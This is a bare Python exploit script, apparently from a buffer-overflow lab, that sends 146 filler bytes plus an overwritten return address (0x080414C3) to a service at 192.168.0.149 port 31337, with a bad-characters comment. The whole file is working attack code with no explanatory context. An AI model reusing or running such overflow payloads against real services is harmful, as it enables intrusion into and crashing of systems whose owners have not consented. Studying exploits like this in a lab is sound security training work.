#!/usr/bin/python
import sys, socket

#080414C3

shellcode = "A" * 146 + "\xc3\x14\x04\x08"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.149',31337))

s.send((shellcode + '\r\n'))
s.close()
#badchars= '\x00\x0a'
